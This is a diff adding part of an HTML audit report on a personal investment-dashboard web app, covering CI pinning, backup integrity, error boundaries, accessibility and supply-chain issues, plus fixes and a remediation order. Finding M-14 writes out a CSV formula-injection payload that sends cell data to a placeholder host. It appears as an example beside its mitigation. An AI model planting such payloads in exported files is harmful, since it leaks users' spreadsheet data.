+          <dt>Files</dt><dd><code>.github/workflows/deploy.yml:24-36</code></dd>
+          <dt>Description</dt>
+          <dd>Every action uses a floating tag: <code>actions/checkout@v6</code>, <code>actions/setup-node@v6</code>, <code>actions/configure-pages@v6</code>, <code>actions/upload-pages-artifact@v5</code>, <code>actions/deploy-pages@v5</code>. The workflow has <code>id-token: write</code>, which is enough for a compromised action to mint an OIDC token to Pages. The realistic blast radius for a personal repo is &ldquo;defacement of <code>gupta-ujjwal.github.io/investment-dashboard</code>,&rdquo; but defacement of a financial dashboard is non-trivial.</dd>
+          <dt>Fix</dt>
+          <dd>Pin to SHAs (Dependabot will keep them updated):
+            <pre class="snippet">uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+uses: actions/setup-node@... # SHA</pre>
+            Add Dependabot config for <code>github-actions</code>.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m3">
+        <div class="finding-head"><span class="id">M-3</span><h4>Google Fonts stylesheet loaded without SRI <code>integrity</code></h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Supply chain</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>index.html:11-14</code></dd>
+          <dt>Description</dt>
+          <dd>The Google Fonts stylesheet has no <code>integrity</code> attribute. The CSS is dynamic (returns different <code>@font-face</code> based on User-Agent) so SRI is not actually feasible. This is a sub-case of H-5; the proper fix is to self-host, which removes both the network trust and the SRI question.</dd>
+          <dt>Fix</dt>
+          <dd>Same fix as H-5: self-host. SRI on dynamic Google Fonts CSS is not a real option.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m4">
+        <div class="finding-head"><span class="id">M-4</span><h4>Schema-version equality check rejects every backup after a <code>DB_VERSION</code> bump</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Reliability</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/lib/restoreBackup.ts:33-61</code></dd>
+          <dt>Description</dt>
+          <dd>The comment at the top of the file acknowledges &ldquo;restores across schema versions need a migration step we haven&rsquo;t written yet&rdquo; but the check is <code>!==</code>. Once <code>DB_VERSION</code> becomes 4 (and <code>holdings.ts</code> already shows v3 was added recently for the history store), every backup taken in v3 is invalid forever.</dd>
+          <dt>Fix</dt>
+          <dd>Forward-migrate during <code>parseBackup()</code>. The v1&rarr;v2&rarr;v3 IDB upgrade logic in <code>holdings.ts</code> already encodes the diffs &mdash; lift the per-row transforms into a pure function and reuse it on backup data.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m5">
+        <div class="finding-head"><span class="id">M-5</span><h4>Backup never includes the <code>history</code> store &mdash; time-series silently lost on restore</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Data integrity</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/storage/holdings.ts:226-237</code> (<code>exportSnapshot</code>), <code>src/storage/history.ts</code></dd>
+          <dt>Description</dt>
+          <dd><code>exportSnapshot()</code> only reads the <code>holdings</code> object store. The <code>history</code> store (added in DB v3) is silently absent. On restore, the user loses every prior portfolio-value point &mdash; the analytics value chart starts from zero again with no warning.</dd>
+          <dt>Fix</dt>
+          <dd>Include history rows in the backup JSON (under a separate top-level key, so older parsers can ignore it). Mention this in the export-success message.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m6">
+        <div class="finding-head"><span class="id">M-6</span><h4>Backup parser accepts implausible FX rates and missing-range validation</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Data integrity</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/lib/restoreBackup.ts:124-135</code>, <code>src/lib/fx.ts:71-74</code></dd>
+          <dt>Description</dt>
+          <dd><code>fx.ts</code> bounds FX between 1 and 1000 &mdash; already loose for USDINR (realistic ~70&ndash;100). <code>restoreBackup.ts</code> only checks <code>isFiniteNumber</code>, so a tampered backup with <code>fxRate: 9999</code> rescales the whole INR view of a USD portfolio by 100&times;.</dd>
+          <dt>Fix</dt>
+          <dd>Centralise FX validation in <code>fx.ts</code> with a single <code>isPlausibleUsdInrRate()</code> (e.g. 40&ndash;150), and have both the runtime fetch and the backup parser call it.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m7">
+        <div class="finding-head"><span class="id">M-7</span><h4>No top-level / route-level error boundary &mdash; one render throw white-screens the page</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Reliability</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/App.tsx</code>, <code>src/routes/AppShell.tsx</code>, <code>src/routes/HoldingsRoute.tsx:258-264</code>, <code>src/routes/AnalyticsRoute.tsx:60-92</code></dd>
+          <dt>Description</dt>
+          <dd>Only the chart subtree is wrapped in <code>ChartErrorBoundary</code>. The KPI cards above the charts and the Holdings table are not, despite consuming the same derived values (<code>portfolioTotals</code>, <code>concentration</code>, <code>formatMoney</code>). A single <code>NaN</code> from a bad import &mdash; or a <code>RangeError</code> from <code>Intl.NumberFormat</code> on a malformed locale &mdash; nukes the whole route.</dd>
+          <dt>Fix</dt>
+          <dd>Add an <code>AppErrorBoundary</code> at the <code>AppShell</code> level with a &ldquo;something broke; export your data&rdquo; recovery action, and reuse <code>ChartErrorBoundary</code>&rsquo;s shape around <code>HoldingsTable</code> and the KPI block.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m8">
+        <div class="finding-head"><span class="id">M-8</span><h4>Multi-tab import race &mdash; stale diff overwrites concurrent writes</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Data integrity</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/routes/import/UploadStep.tsx:29-34</code>, <code>src/routes/import/PreviewStep.tsx:27-65</code>, <code>src/storage/holdings.ts</code> (<code>commitImport</code>)</dd>
+          <dt>Description</dt>
+          <dd>The diff is computed at upload time against a snapshot of <code>getForSource()</code> and then committed minutes later from PreviewStep. Between the two, a second tab can have run its own import. The first tab&rsquo;s <code>commitImport</code> applies its diff against the new state, silently overwriting whatever the second tab added.</dd>
+          <dt>Fix</dt>
+          <dd>Re-read state inside the IDB transaction during <code>commitImport</code>, recompute the diff atomically, and refuse the commit if the snapshot has changed (surfacing &ldquo;another tab modified holdings; please re-review&rdquo;). Optionally use <code>BroadcastChannel</code> to invalidate stale wizard state.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m9">
+        <div class="finding-head"><span class="id">M-9</span><h4><code>cellNumber()</code> coerces unparseable strings to <code>0</code>, masking malformed exports</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Data integrity</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/parsers/xlsx-utils.ts:13-23</code></dd>
+          <dt>Description</dt>
+          <dd><code>cellNumber()</code> swallows every unparseable input and returns <code>0</code>. The ghost-row filter then drops rows where <code>quantity === 0</code>, so a typo-d quantity (<code>"thousand"</code>) becomes &ldquo;row missing&rdquo; with no error to the user. Required vs. optional numeric fields are not distinguished &mdash; <code>cellNumberOrUndefined</code> exists but isn&rsquo;t used for required columns.</dd>
+          <dt>Fix</dt>
+          <dd>For required columns, use <code>cellNumberOrUndefined</code> and treat <code>undefined</code> as a parse error tied to the row + symbol. Show these in the preview as &ldquo;skipped: 3 rows with unreadable quantity (TSLA, ...).&rdquo;</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m10">
+        <div class="finding-head"><span class="id">M-10</span><h4>Restore baseCurrency mismatch silently orphans historical analytics</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Data integrity</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/storage/history.ts:14-22</code>, <code>src/lib/analytics.ts:148-163</code></dd>
+          <dt>Description</dt>
+          <dd>History rows are stamped with the active <code>baseCurrency</code>. <code>valueSeries()</code> filters out records whose stamp doesn&rsquo;t match the current setting. If the user toggles base currency, every prior history point becomes invisible. There&rsquo;s no UI signal that points exist but are filtered.</dd>
+          <dt>Fix</dt>
+          <dd>Either reproject history points at read time (store the underlying USD/INR breakdown, not the converted value) or warn the user when toggling base currency that history will appear empty.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m11">
+        <div class="finding-head"><span class="id">M-11</span><h4>FX fetch has no retry / backoff / cached fallback signalling</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Reliability</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/lib/fx.ts</code>, <code>src/lib/refreshFx.ts</code></dd>
+          <dt>Description</dt>
+          <dd><code>fetchUsdInrRate()</code> uses a 3-second timeout, no retries, and no jitter. <code>PreviewStep.tsx</code> falls back to <code>settings.lastFxRate</code> without telling the user it&rsquo;s using a stale value. For a portfolio with mostly USD holdings this drifts cost basis materially.</dd>
+          <dt>Fix</dt>
+          <dd>One retry with jitter, then fall back to the cached rate <i>and surface that fact in the import preview</i> (&ldquo;Using cached FX from 2 days ago&rdquo;). Block the commit if the rate is older than a configurable threshold (default: 7 days).</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m12">
+        <div class="finding-head"><span class="id">M-12</span><h4>No service worker &mdash; app does not work offline</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Reliability</span></div>
+        <dl class="kv">
+          <dt>Description</dt>
+          <dd>For an &ldquo;edge-only / local-first&rdquo; dashboard, the inability to load the UI without network is a notable inconsistency &mdash; the data is local, but the app shell isn&rsquo;t. A simple cache-first SW would close this. Defer until after Phase 1 ships, but plan for it.</dd>
+          <dt>Fix</dt>
+          <dd>Add <code>vite-plugin-pwa</code> with a precache of the built shell. Don&rsquo;t pre-cache user data; IDB is already local.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m13">
+        <div class="finding-head"><span class="id">M-13</span><h4>Modal lacks focus trap and focus restore (WCAG 2.1 AA)</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">A11y / Reliability</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/components/HoldingForm.tsx:279-314</code></dd>
+          <dt>Description</dt>
+          <dd>The modal is correctly marked <code>aria-modal="true"</code> with <code>aria-labelledby</code> but doesn&rsquo;t trap focus or restore it on close. A keyboard user tabbing through fields rolls out into the background route.</dd>
+          <dt>Fix</dt>
+          <dd>Use the platform <code>&lt;dialog&gt;</code> element (supported in all targets) or a small inline focus-trap; on close, restore focus to the element that opened the modal.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m14">
+        <div class="finding-head"><span class="id">M-14</span><h4>CSV/formula-injection: leading <code>=+@-</code> not stripped from parsed cell text</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Security</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/parsers/xlsx-utils.ts:3-11</code> (<code>cellString</code>)</dd>
+          <dt>Description</dt>
+          <dd>The app doesn&rsquo;t execute formulas, but if &ldquo;export holdings as CSV&rdquo; ships later (a likely Phase 1 ask), an attacker who slipped <code>=HYPERLINK("http://x/?p="&amp;A2,"click")</code> into an imported broker file would have it appear verbatim in the user&rsquo;s exported CSV. Excel/Sheets executes formulas on open.</dd>
+          <dt>Fix</dt>
+          <dd>At parse time, prefix any cell starting with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, TAB, or CR with a single quote (the OWASP-recommended mitigation) before storing. Alternatively, do it only at CSV-export time. Doing it at parse is simpler and survives future export paths.</dd>
+        </dl>
+      </section>
+
+      <h2 id="low">Low severity</h2>
+
+      <section class="finding" id="f-l1">
+        <div class="finding-head"><span class="id">L-1</span><h4>Duplicate <code>deploy.yml</code> at repo root vs. <code>.github/workflows/</code></h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Repo hygiene</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>deploy.yml</code>, <code>.github/workflows/deploy.yml</code></dd>
+        <dt>Description</dt><dd>Two identical files. Only <code>.github/workflows/deploy.yml</code> runs. The root copy is dead. README explains why &mdash; an OAuth-scope workaround &mdash; but the workaround is no longer in force.</dd>
+        <dt>Fix</dt><dd><code>git rm deploy.yml</code> and update README. (Sub-agent flagged this as Critical; it&rsquo;s confusing, not breaking &mdash; downgrading.)</dd></dl>
+      </section>
+
+      <section class="finding" id="f-l2">
+        <div class="finding-head"><span class="id">L-2</span><h4>CI <code>node-version: lts/*</code> floats &mdash; non-reproducible builds</h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Build / CI</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>.github/workflows/deploy.yml:27</code></dd>
+        <dt>Fix</dt><dd>Pin to a specific major (<code>22</code>) and add a matching <code>.nvmrc</code>.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-l3">
+        <div class="finding-head"><span class="id">L-3</span><h4>No explicit <code>build.sourcemap: false</code> in <code>vite.config.ts</code></h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Security (minor)</span></div>
+        <dl class="kv"><dt>Description</dt><dd>Vite&rsquo;s default is already <code>false</code>; making it explicit defends against an accidental flip. No secrets are at risk either way &mdash; this only changes how much help an attacker gets in reverse-engineering bugs.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-l4">
+        <div class="finding-head"><span class="id">L-4</span><h4>Build script doesn&rsquo;t verify <code>dist/</code> is non-empty before deploy</h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Reliability</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>package.json</code> (<code>build</code>), <code>.github/workflows/deploy.yml</code></dd>
+        <dt>Description</dt><dd>A subtle vite plugin failure that emits an empty <code>dist/</code> would deploy a broken site without alerting. The workflow trusts a zero exit code.</dd>
+        <dt>Fix</dt><dd>Append <code>test -s dist/index.html</code> to the build script or as an explicit CI step.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-l5">
+        <div class="finding-head"><span class="id">L-5</span><h4>Undo hook keeps only one snapshot &mdash; rapid deletes lose recovery</h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Reliability / UX</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>src/components/useUndoableAction.ts:38-85</code></dd>
+        <dt>Description</dt><dd>By design (&ldquo;single toast policy&rdquo;), a second destructive action within 5s discards the first snapshot. Acceptable for delete-one-undo-one; risky if the UI ever supports bulk-select-delete.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-l6">
+        <div class="finding-head"><span class="id">L-6</span><h4>Closed-position rows are never marked stale regardless of last refresh</h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Data quality</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>src/lib/holdingsView.ts:82-85</code></dd>
+        <dt>Description</dt><dd>A closed row is always <code>isStale: false</code>. Acceptable until a closed row is re-opened by a fresh broker import &mdash; then its <code>importedAt</code> is new but its price snapshot may be ancient.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-l7">
+        <div class="finding-head"><span class="id">L-7</span><h4>Backup parser doesn&rsquo;t enforce timestamp invariants</h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Data integrity</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>src/lib/restoreBackup.ts:120-121</code></dd>
+        <dt>Description</dt><dd>Only finiteness is checked; <code>updatedAt &lt; createdAt</code> or <code>importedAt</code> in the year 2400 will pass. No code currently breaks on these, but they leak into analytics axes.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-l8">
+        <div class="finding-head"><span class="id">L-8</span><h4>No max-length on parsed cell text &mdash; latent ReDoS / memory growth</h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Reliability</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>src/parsers/xlsx-utils.ts</code> (<code>cellString</code>), <code>src/parsers/groww.ts:107-109</code></dd>
+        <dt>Description</dt><dd>Current regexes (<code>/\bINVIT\b/</code>, etc.) are safe, but a 1 MB-long cell flows through unbounded. Defense in depth: cap <code>cellString</code> at 1024 chars.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-l9">
+        <div class="finding-head"><span class="id">L-9</span><h4>User name rendered verbatim in greeting &mdash; extension / screen-share surface</h4><span class="pill low">Low</span></div>
+        <div class="finding-meta"><span class="pill cat">Privacy</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>src/routes/SettingsRoute.tsx:20</code></dd>
+        <dt>Description</dt><dd>Single-user, local-only app &mdash; this is intended. Worth a tag because screen-sharing the dashboard for a demo would broadcast it. Maybe move to a subtle &ldquo;Hi &rarr; UG&rdquo; initials variant.</dd></dl>
+      </section>
+
+      <h2 id="info">Informational</h2>
+
+      <section class="finding" id="f-i1">
+        <div class="finding-head"><span class="id">I-1</span><h4>Caret ranges on every dependency &mdash; mitigated by lockfile + <code>npm ci</code></h4><span class="pill info">Info</span></div>
+        <div class="finding-meta"><span class="pill cat">Supply chain</span></div>
+        <dl class="kv"><dt>Description</dt><dd>CI uses <code>npm ci</code> so the lockfile is authoritative. Carets only matter if someone runs <code>npm install</code> or deletes the lockfile. Worth knowing; not worth changing today.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-i2">
+        <div class="finding-head"><span class="id">I-2</span><h4>No <code>npm audit</code> step in CI</h4><span class="pill info">Info</span></div>
+        <div class="finding-meta"><span class="pill cat">Supply chain</span></div>
+        <dl class="kv"><dt>Fix</dt><dd>Add <code>npm audit --omit=dev --audit-level=high</code> after <code>npm ci</code>. Soft-fail to keep deploys unblocked; alert via PR check.</dd></dl>
+      </section>
+
+      <section class="finding" id="f-i3">
+        <div class="finding-head"><span class="id">I-3</span><h4>README contains a stale OAuth workaround comment</h4><span class="pill info">Info</span></div>
+        <div class="finding-meta"><span class="pill cat">Docs</span></div>
+        <dl class="kv"><dt>Files</dt><dd><code>README.md:35-38</code></dd>
+        <dt>Fix</dt><dd>Delete the &ldquo;OAuth token lacks workflow scope&rdquo; paragraph along with the duplicate root <code>deploy.yml</code> (L-1).</dd></dl>
+      </section>
+
+      <h2 id="reliability-tenets">Mapping to Juspay&rsquo;s 10X reliability tenets</h2>
+      <p>
+        The four tenets that actually apply to a single-user static SPA:
+      </p>
+      <ul>
+        <li><b>Tenet 2 (critical-path simplicity):</b> The import wizard is the critical path. <b>H-3, M-8, M-9</b> add edge cases on this path.</li>
+        <li><b>Tenet 3 (blast-radius limits):</b> <b>M-7</b> (no top-level error boundary) and <b>H-4</b> (silent IDB failure) directly contradict this tenet &mdash; a single bad row should not brick the page, and a failed write should not look like success.</li>
+        <li><b>Tenet 4 (anomaly detection / RCA):</b> <b>M-9, M-11</b> &mdash; the app silently rounds, defaults, and falls back. Surface every fallback to the user.</li>
+        <li><b>Tenet 6 (staggered rollouts):</b> Not applicable &mdash; static site, one user. Skip.</li>
+      </ul>
+
+      <h2 id="recommended">Recommended remediation order</h2>
+      <ol>
+        <li><b>Quick wins (1 PR):</b> H-5 (self-host fonts) + M-1 (add CSP meta) + L-1 (delete duplicate <code>deploy.yml</code>) + L-2 (pin Node) + L-3 (explicit <code>sourcemap: false</code>) + M-2 (pin GH Actions to SHAs).</li>
+        <li><b>Trust untrusted input (1 PR):</b> H-1 (share <code>assertHolding</code>) + H-3 (file-size + row caps) + M-9 (distinguish required vs. optional numeric cells) + M-14 (strip formula-injection prefixes).</li>
+        <li><b>Backup correctness (1 PR):</b> H-2 (allow <code>manual</code>) + M-4 (schema migration) + M-5 (include history) + M-6 (FX bounds) + L-7 (timestamp invariants).</li>
+        <li><b>Error containment (1 PR):</b> H-4 (Result-shaped IDB writes; remove <code>location.reload()</code>) + M-7 (route-level error boundaries) + M-8 (re-diff inside transaction) + M-13 (modal focus trap).</li>
+        <li><b>Polish:</b> M-10, M-11, M-12, L-5, L-6, L-8, L-9, I-1&ndash;I-3.</li>
+      </ol>
+
+      <footer>
+        <p>
+          Audit conducted on a worktree of <code>main @ 35334a8</code> by four parallel
+          read-only review passes (storage, parsers, UI, build/deploy). High-severity
+          claims spot-checked against the source. No code modified. Severities reflect
+          this app&rsquo;s threat model (edge-only, single user, no backend), not
+          generic web-app defaults &mdash; that&rsquo;s why &ldquo;no CSP&rdquo; is Medium and
+          &ldquo;negative-quantity import&rdquo; is High.
+        </p>
+      </footer>
+    </div>
+  </body>
+</html>
